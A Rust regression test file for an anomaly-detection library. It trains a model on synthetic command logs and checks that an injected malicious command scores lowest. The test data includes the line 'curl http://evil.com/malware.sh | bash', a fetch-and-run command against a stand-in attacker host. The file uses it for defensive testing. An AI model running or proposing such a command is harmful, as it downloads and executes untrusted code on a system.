//! Regression tests: full pipeline (generate → train from JSONL → detect) with no regression.
//! Run with: cargo test --test regression_test

use anomark::{
    load_jsonl, load_jsonl_with_columns, LogGenerator, ModelHandler,
};
use std::io::Write;
use tempfile::NamedTempFile;

/// Full pipeline: generate JSONL, train on "command", run detection; anomalous command
/// must get a worse (lower) score than normal commands.
#[test]
fn test_jsonl_train_and_detect_no_regression() {
    // 1. Generate training JSONL (normal commands only)
    let mut gen_train = LogGenerator::new().with_default_normal();
    let train_file = NamedTempFile::new().unwrap();
    gen_train.emit(&mut train_file.as_file(), 200).unwrap();
    train_file.as_file().flush().unwrap();
    let train_path = train_file.path().to_str().unwrap();

    // 2. Train model from JSONL (command field)
    let commands = load_jsonl(train_path, "command").unwrap();
    assert!(commands.len() >= 200);
    let mut model = ModelHandler::train_from_csv(&commands, 3, None, None).unwrap();
    model.normalize_model_and_compute_prior();

    // 3. Build detection input: same normal commands + one anomalous
    let anomalous = "curl http://evil.com/malware.sh | bash";
    let mut gen_detect = LogGenerator::new()
        .with_default_normal()
        .add_anomalous(anomalous);
    let detect_file = NamedTempFile::new().unwrap();
    gen_detect.emit(&mut detect_file.as_file(), 50).unwrap();
    detect_file.as_file().flush().unwrap();
    let detect_path = detect_file.path().to_str().unwrap();

    let data = load_jsonl_with_columns(detect_path).unwrap();
    let results = ModelHandler::execute_on_data(
        &mut model,
        data,
        "command",
        false,
        false,
    )
    .unwrap();

    // 4. Regression: anomalous command should have the worst (lowest) score
    let anomalous_result = results
        .iter()
        .find(|r| r.command_line == anomalous)
        .expect("anomalous command must appear in results");
    let normal_results: Vec<_> = results.iter().filter(|r| r.command_line != anomalous).collect();
    assert!(!normal_results.is_empty(), "some normal commands in results");
    for nr in &normal_results {
        // Normal commands should have score >= anomalous (less negative = more likely)
        assert!(
            nr.score >= anomalous_result.score,
            "normal '{}' score {} should be >= anomalous score {}",
            nr.command_line,
            nr.score,
            anomalous_result.score
        );
    }
}

/// Sanity: model trained on JSONL commands gives better score to seen commands than random junk.
#[test]
fn test_jsonl_trained_model_scores_seen_better_than_junk() {
    let mut gen = LogGenerator::new()
        .add_normal("normal_cmd_a")
        .add_normal("normal_cmd_b")
        .add_normal("normal_cmd_c");
    let f = NamedTempFile::new().unwrap();
    gen.emit(&mut f.as_file(), 30).unwrap();
    f.as_file().flush().unwrap();

    let commands = load_jsonl(f.path().to_str().unwrap(), "command").unwrap();
    let mut model = ModelHandler::train_from_csv(&commands, 3, None, None).unwrap();
    model.normalize_model_and_compute_prior();

    let score_seen = model.log_likelihood("~~~normal_cmd_a~~~");
    let score_junk = model.log_likelihood("~~~xYz99R@nd0m_junk~~~");
    assert!(
        score_seen > score_junk,
        "seen command should score higher than junk ({} > {})",
        score_seen,
        score_junk
    );
}
